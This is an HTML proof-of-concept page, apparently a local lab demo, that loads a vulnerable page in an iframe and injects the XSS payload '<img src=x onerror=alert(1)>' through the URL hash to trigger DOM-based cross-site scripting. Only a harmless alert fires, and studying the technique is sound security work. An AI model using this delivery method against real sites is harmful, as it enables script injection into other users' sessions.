<!doctype html>
<html>
<head><meta charset="utf-8"><title>Exploit page</title></head>
<body>
  <h1>Exploit page (delivers iframe)</h1>
  <p>This page will create an iframe to the vulnerable page and append an HTML payload into the hash to trigger a DOM XSS (local demo).</p>

  <p>
    <button id="deliver">Deliver exploit iframe (onload append)</button>
    <button id="direct">Direct iframe with payload in src</button>
  </p>

  <div id="frame"></div>

<script>
function makeIframe(src, onloadJs) {
  var ifr = document.createElement('iframe');
  ifr.style.width = '100%';
  ifr.style.height = '300px';
  ifr.src = src;
  if (onloadJs) {
    // set attribute so it runs in parent context to change src of iframe
    ifr.setAttribute('onload', onloadJs);
  }
  document.getElementById('frame').innerHTML = '';
  document.getElementById('frame').appendChild(ifr);
}

document.getElementById('deliver').onclick = function(){
  // Append payload into src onload: this.src += '<img src=x onerror=alert(1)>';
  makeIframe('vulnerable.html#', "this.src += '<img src=x onerror=alert(1)>'");
};

document.getElementById('direct').onclick = function(){
  // Put payload directly in src (may or may not trigger depending on timing)
  makeIframe("vulnerable.html#<img src=x onerror=alert(1)>");
};
</script>
</body>
</html>
